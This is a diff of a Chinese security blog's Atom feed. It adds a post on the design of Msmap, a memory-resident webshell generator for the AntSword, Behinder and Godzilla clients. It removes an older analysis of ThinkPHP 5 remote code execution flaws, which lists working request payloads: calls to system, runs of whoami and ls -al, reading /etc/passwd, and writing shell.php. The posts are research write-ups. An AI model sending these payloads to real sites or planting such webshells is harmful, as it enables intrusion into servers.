@@ -6,7 +6,7 @@
   <link href="https://hosch3n.github.io/atom.xml" rel="self"/>
   
   <link href="https://hosch3n.github.io/"/>
-  <updated>2022-08-08T12:58:21.370Z</updated>
+  <updated>2022-08-11T06:31:44.894Z</updated>
   <id>https://hosch3n.github.io/</id>
   
   <author>
@@ -17,11 +17,42 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Msmap内存马生成框架（二）</title>
+    <link href="https://hosch3n.github.io/2022/08/09/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
+    <id>https://hosch3n.github.io/2022/08/09/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
+    <published>2022-08-09T03:34:37.000Z</published>
+    <updated>2022-08-11T06:31:44.894Z</updated>
+    
+    <content type="html"><![CDATA[<p>在太阳系以太阳为中心，可以用较为简洁的数学公式拟合出周围行星的运动规律，牛顿定律解释不了时就升级为广义相对论（比如水星近日点进动）。Msmap经过三天三次更新迭代，兼容了三个常用WebShell管理客户端，适配的过程修正了一些解藕不充分的问题。</p><p>对于俗称的WebShell连接密码，蚁剑用来从请求参数中取数据，冰蝎用作解密请求体数据的密钥，哥斯拉则拆分为了<code>Password</code>和<code>Key</code>，<code>Password</code>取数据、<code>Key</code>用作密钥。为了生成体验不割裂，设计上让蚁剑的密码哈希作为密钥，冰蝎密码从哈希改为明文，哥斯拉的<code>Password</code>和<code>Key</code>用同一个值。这应该并没有降级工具在原本设计上的安全性，冰蝎密码是在客户端取的哈希、哥斯拉回显时密钥也是确定的，也就是说这些机制并不是为防止骑马设计的，主要是对抗纯流量审查，严防骑马害得上RSA。但这是内存马，相对来说更难看到类属性值。</p><blockquote><p>要支持哥斯拉自定义<code>Key</code>也好改，生成设置Password时用逗号分隔拆分一下就行了，只是目前感觉不是很必要</p></blockquote><p>关于执行体，蚁剑是传入<code>response</code>对象内部处理输出，冰蝎是将<code>response</code>对象封装进Map传入内部处理输出，哥斯拉是传入用来接收执行结果的对象，在内存马中自定义处理输出。关于回显编码/加密器，蚁剑和冰蝎是跟着流量走的，哥斯拉是写在内存马中自定义处理的，所以Stub代码片段中会多一个Base64编码函数。</p><p>可以看出哥斯拉在这块耦合度更低，且在第一次流量类初始化后保存对象，后续只用发出简短的指令而非完整类字节码。我有点一根筋，不想因为一个Stub要存对象，就往所有组件类里新增属性，所以复用了注入时的线程锁对象，让被冷落的小可怜活了回来。</p><p>还有一点结构性调整是，感觉冰蝎没有回显界定符和抢占输出，如果访问路径本身有内容输出的话，会干扰到冰蝎拿回显结果。同时也是为了兼容WsFilter及各个<code>stub</code>，将原本在<code>hook</code>中处理的回显输出部分改放到了<code>stub</code>中。</p><p>这个兼容的过程，似乎也与用更精准的数学公式去拟合物理规律 异曲同工（技术没啥长进，倒是越来越会胡说八道了</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;在太阳系以太阳为中心，可以用较为简洁的数学公式拟合出周围行星的运动规律，牛顿定律解释不了时就升级为广义相对论（比如水星近日点进动）。Msmap经过三天三次更新迭代，兼容了三个常用WebShell管理客户端，适配的过程修正了一些解藕不充分的问题。&lt;/p&gt;
+&lt;p&gt;对于俗称的We</summary>
+      
+    
+    
+    
+    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
+    
+    
+    <category term="WebShell" scheme="https://hosch3n.github.io/tags/WebShell/"/>
+    
+    <category term="AntSword" scheme="https://hosch3n.github.io/tags/AntSword/"/>
+    
+    <category term="Behinder" scheme="https://hosch3n.github.io/tags/Behinder/"/>
+    
+    <category term="Godzilla" scheme="https://hosch3n.github.io/tags/Godzilla/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Msmap内存马生成框架（一）</title>
     <link href="https://hosch3n.github.io/2022/08/08/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%80%EF%BC%89/"/>
     <id>https://hosch3n.github.io/2022/08/08/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%80%EF%BC%89/</id>
     <published>2022-08-08T08:37:10.000Z</published>
-    <updated>2022-08-08T12:58:21.370Z</updated>
+    <updated>2022-08-09T03:36:17.888Z</updated>
     
     <content type="html"><![CDATA[<p>一直想要把这部分的知识沉淀一下，最近看到井喷式的新内存马后有了一些小想法，所以整了这么个烂活，作为工具的同时也是一个知识框架。如果能方便大家那就更开心了，不好用也欢迎来issue里喷俺，只是喷完要对人家负责（doge，提出建设性建议</p><hr><p>先拉一面大旗，<del>从钱老的总体设计部可以看出顶层设计的重要性</del>，抱歉调子起高了</p><p><img src="/img/msmapa_a.jpg"></p><p>内存马就是在容器本身的执行流程上，额外加上自己的操作逻辑。比如有个自动化工厂门没锁，我们溜进去，给流水线加一个专门贴狗头的机器，就是利用漏洞打内存马的过程。工厂就象征着Web应用服务器。</p><p>这个狗头机器是加在流水线开头、中间还是结尾，就对应着内存马打到Web应用服务器的不同组件里，流水线一般就是一次网络请求。</p><p>不同工厂的门有圆的有方的有菱形，所以我们的机器为了能偷运进去，就需要适配成不同的外形，但不论外形怎么变，它最终还是一台狗头机器。也就是说内存马要注入进不同的Web应用服务器，需要封装适配成不同的类，但最终还是用于执行某个操作。</p><p>我们要是想机器不止能贴狗头，而是能根据指示来决定贴上狗头、猫猫、嘤嘤鹰。<strong>外形什么的都不用变</strong>，只要升级一下贴纸模块。又或者某些安保好一点的工厂，说猫猫狗狗贴纸不得入内，我们就可以给机器加上一个二维码识别模块，运二维码进去机器内再解码成猫猫狗狗躲避安检。</p><p>贴纸模块就对应着执行体（比如执行系统命令、执行蚁剑客户端流量等），二维码模块就对应着解码器，而二维码生成器就是WebShell客户端的流量加密/编码函数。</p><p>各模块间能相互兼容，平滑替换为别的模块，在软件工程中叫做解藕。msmap做的事就是解藕组件类、编码器与执行体，把内存马这个大任务，拆分成拿context、注入组件、流量解密、代码执行等小目标。这么干除了方便自由组合外，也可以让新技术（Tomcat迟早要被师傅们插成TomShell）更快地应用在实战上。</p><blockquote><p>同理客户端payload不依赖request等对象，解藕出功能执行部分，提供一个接口让外部自己解决输入输出，单论兼容性方面也会更好一点点</p></blockquote><p>胡说八道完了，扯点踏实点的东西。用Python写主要是相对熟悉一些，但是命令行用着终究还是不太方便，不知道用Qt写GUI怎么样。目前这个选择菜单为了支持回退还费了点心思，本来用了另一种方式实现栈但是太别扭了。马子兼容性方面从beichen大佬的代码里偷师学到了用动态代理兼容<code>javax</code>与<code>jakarta</code>的办法，各种方法和类全部用反射，所以编译时不用依赖Tomcat的API了，但目前WsFilter还没调通所以这个还没能安排上自动编译。。。加载Killer本来准备兼容打包一下，后来想起yzddMr6大佬已经集成进了插件，我也就没必要再画蛇添足了。</p><p>最后希望自己能慢慢完善工具，让它支持更多容器组件，也算是作为逐渐成长的一种见证，与各位师傅共勉！</p>]]></content>
     
@@ -39,6 +70,12 @@
     
     
     <category term="Tomcat" scheme="https://hosch3n.github.io/tags/Tomcat/"/>
+    
+    <category term="WebShell" scheme="https://hosch3n.github.io/tags/WebShell/"/>
+    
+    <category term="AntSword" scheme="https://hosch3n.github.io/tags/AntSword/"/>
+    
+    <category term="Killer" scheme="https://hosch3n.github.io/tags/Killer/"/>
     
   </entry>
   
@@ -597,33 +634,6 @@
     <category term="JA3" scheme="https://hosch3n.github.io/tags/JA3/"/>
     
     <category term="JARM" scheme="https://hosch3n.github.io/tags/JARM/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>TP5漏洞分析代码执行篇</title>
-    <link href="https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/"/>
-    <id>https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/</id>
-    <published>2020-11-05T11:51:12.000Z</published>
-    <updated>2022-05-11T08:28:41.373Z</updated>
-    
-    <content type="html"><![CDATA[<p>环境搭建基础可以参考SQL注入篇和官方文档</p><h2 id="代码执行1"><a href="#代码执行1" class="headerlink" title="代码执行1"></a>代码执行1</h2><p>通过传参可以调用任意类方法，调用一些具有回调功能的函数时可以导致代码执行。</p><p>影响版本：</p><ul><li>5.0.7&lt;=ThinkPHP&lt;=5.0.22</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.1</span><br><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.0</span><br><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username             # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;runtime&#x2F;log&#x2F;202012&#x2F;02.log  # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php     # 包含任意.php文件</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.23</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">改进控制器获取</a>这个commit</p><p><img src="/img/tp5ldfxrce_a.png"></p><p>加了个限制大小写字母的过滤。从官方文档可以知道，获取控制器的方式取决于用的哪种路由模式，ThinkPHP默认无强制路由、支持兼容模式，SQL注入篇中都是用的<code>?s=/模块/控制器/方法</code>这种Payload，此处可以合理猜测能够调用到危险方法。</p><p>将源码更新为5.0.22，直接全局搜索<code>eval</code>、<code>assert</code>和<code>system</code>这类赤果果的关键词基本没得搞头，但是搜回调类、反射类的函数就会眼前一亮。</p><p><img src="/img/tp5ldfxrce_b.png"></p><p>以<code>reflect</code>为例搜到的App类（thinkphp/library/think/App.php）第一条结果就是一个静态<code>invokeFunction</code>方法，<code>invokeArgs</code>方法类似<code>call_user_func_array</code>函数，只要<code>$function</code>和<code>$args</code>可控就能实现控制任意函数和参数代码执行了。跟进<code>self::bindParams</code>方法可以看到它的作用就是获取传入的参数，通过完全限定名称的命名空间调用并无脑传参就行了。</p><p><img src="/img/tp5ldfxrce_d.png"></p><p>5.1版本的利用方法类似而且能利用的类比5.0更多，官方正则判断的修复方式就是卡了命名空间的逃逸。</p><ul><li><code>$_SERVER[&#39;PATH_INFO&#39;]</code>会将<code>\</code>转为<code>/</code></li></ul><h2 id="代码执行2"><a href="#代码执行2" class="headerlink" title="代码执行2"></a>代码执行2</h2><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">sss&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;route[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"># 包含任意文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[REQUEST_METHOD]&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 5.1.17 &lt;&#x3D; ThinkPHP5 &lt;&#x3D; 5.1.32 需要error_reporting(0);</span><br><span class="line">c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.24</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">改进Request类</a>这个commit</p><p><img src="/img/tp5ldfxrce_e.png"></p><p>调用<code>Request</code>类方法前做了白名单判断，猜测漏洞可能是能调用当前类任意方法，找到<code>Config::get(&#39;var_method&#39;)</code>对应的值为<code>_method</code>。</p><p><img src="/img/tp5ldfxrce_f.png"></p><p>回顾一下SQL注入篇中说过<code>凡是使用框架提供的请求变量获取方法(Request类param方法及input助手函数)，都会经过这个filterExp方法的过滤</code>，其中的<code>filterExp</code>方法是被<code>filterValue</code>方法拉起调用的，而<code>filterValue</code>方法中就存在敏感函数<code>call_user_func</code>：</p><p><img src="/img/tp5ldfxrce_g.png"></p><p>全局搜索对应的<code>filterValue</code>方法，看到可以由824行的<code>cookie</code>方法或是由994行的<code>input</code>方法触发（但是似乎框架默认逻辑没有用到<code>cookie</code>方法）。</p><p><img src="/img/tp5ldfxrce_h.png"></p><p>跟进<code>getFilter</code>方法后看上去影响不大先不管，回来继续向上跟进<code>array_walk_recursive</code>函数传递的第一和第三个参数，进而寻找调用了<code>input</code>方法的地方（<code>-&gt;input\(|::input\(</code>）：</p><p><img src="/img/tp5ldfxrce_i.png"></p><p>这个构造函数简直来得不要太妙（是个伏笔2333）：如果当前类中的属性名有与<code>$options</code>数组中键名相同的，就会被覆盖为相应的键值，并且给<code>$this-&gt;input</code>属性赋值了完全可控的<code>php://input</code>。</p><p>有很多地方调用了<code>input</code>方法，先看下<code>Request</code>类的<code>param</code>方法：</p><p><img src="/img/tp5ldfxrce_j.png"></p><p>出现了被更新白名单的<code>method</code>方法，至此利用链的链尾已经基本清晰：</p><p>?-&gt;<code>param</code>-&gt;<code>method</code>、<code>input</code>-&gt;<code>filterValue</code>-&gt;<code>call_user_func</code></p><p>接下来需要思考如何通过<code>Request</code>类的某个方法修改默认为空的<code>$filter</code>的值呢？刚才那个构造函数刚好可以实现对<code>$this-&gt;filter</code>变量覆盖！也就是通过$_POST传入<code>_method=__construct&amp;filter[]=system</code>。搞定了一个参数，继续想办法搞定另外一个参数：</p><p><img src="/img/tp5ldfxrce_k.png"></p><p>继续通过变量覆盖控制<code>$this-&gt;get</code>或者<code>$this-&gt;route</code>的值，就能直接进到<code>input</code>方法中。也就是继续通过$_POST传入<code>&amp;get[]=whoami</code>或是<code>&amp;route[]=whoami</code>，此时如果<code>&#39;app_debug&#39; =&gt; true,</code>就可以直接看到命令执行结果：</p><p><img src="/img/tp5ldfxrce_l.png"></p><p>这也印证了此时的<code>param</code>方法确实被框架调用了，但是一旦关掉<code>app_debug</code>就会发现并不能RCE了 T^T，显然事情没这么简单，我们还是得继续老实向前分析调用栈。动态调试一下看看调用栈里是谁翻了<code>param</code>方法的牌子：</p><p><img src="/img/tp5ldfxrce_m.png"></p><p><code>self::$debug</code>就是框架从配置文件中加载的值，所以关掉<code>app_debug</code>就不会调用到<code>param</code>方法了（淦）。那还有没有办法调用到呢？全局搜索可以看到当<code>App</code>类的<code>exec</code>方法中<code>$dispatch[&#39;type&#39;]</code>为<code>controller</code>或是<code>method</code>时就可以。</p><p><img src="/img/tp5ldfxrce_n.png"></p><p>于是继续跟进方法调用和变量传递：</p><p><img src="/img/tp5ldfxrce_o.png"></p><p><img src="/img/tp5ldfxrce_p.png"></p><p><img src="/img/tp5ldfxrce_q.png"></p><p><code>check</code>方法里面有点复杂。。。马后炮一下直接先看<code>parseRule</code>方法：</p><p><img src="/img/tp5ldfxrce_r.png"></p><p>需要<code>$route</code>为<code>\</code>或者<code>@</code>，继续回去跟进变量传递：</p><p><img src="/img/tp5ldfxrce_s.png"></p><p>TP5完整版或是通过<code>composer require topthink/think-captcha 1.*</code>安装的验证码扩展，会在<code>vendor/topthink/think-captcha/src/helper.php</code>中注册一条<code>get</code>路由。由于此处<code>$method</code>是通过<code>$request-&gt;method()</code>获取到的，所以能够通过$_POST传入<code>&amp;method=get</code>间接对其进行变量覆盖。</p><p><img src="/img/tp5ldfxrce_t.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/222672">ThinkPHP5.0.x RCE分析与利用</a></p><p><a href="https://0kee.360.cn/blog/thinkphp-5-x-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">THINKPHP 5.X RCE 漏洞分析与利用总结</a></p><p><a href="https://www.anquanke.com/post/id/177173">天融信关于ThinkPHP5.1框架结合RCE漏洞的深入分析</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p><p><a href="https://paper.seebug.org/1377/">ThinkPHP 组件漏洞与攻击链分析</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;环境搭建基础可以参考SQL注入篇和官方文档&lt;/p&gt;
-&lt;h2 id=&quot;代码执行1&quot;&gt;&lt;a href=&quot;#代码执行1&quot; class=&quot;headerlink&quot; title=&quot;代码执行1&quot;&gt;&lt;/a&gt;代码执行1&lt;/h2&gt;&lt;p&gt;通过传参可以调用任意类方法，调用一些具有回调功能的函数时可</summary>
-      
-    
-    
-    
-    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-    <category term="Thinkphp" scheme="https://hosch3n.github.io/tags/Thinkphp/"/>
-    
-    <category term="RCE" scheme="https://hosch3n.github.io/tags/RCE/"/>
     
   </entry>
   
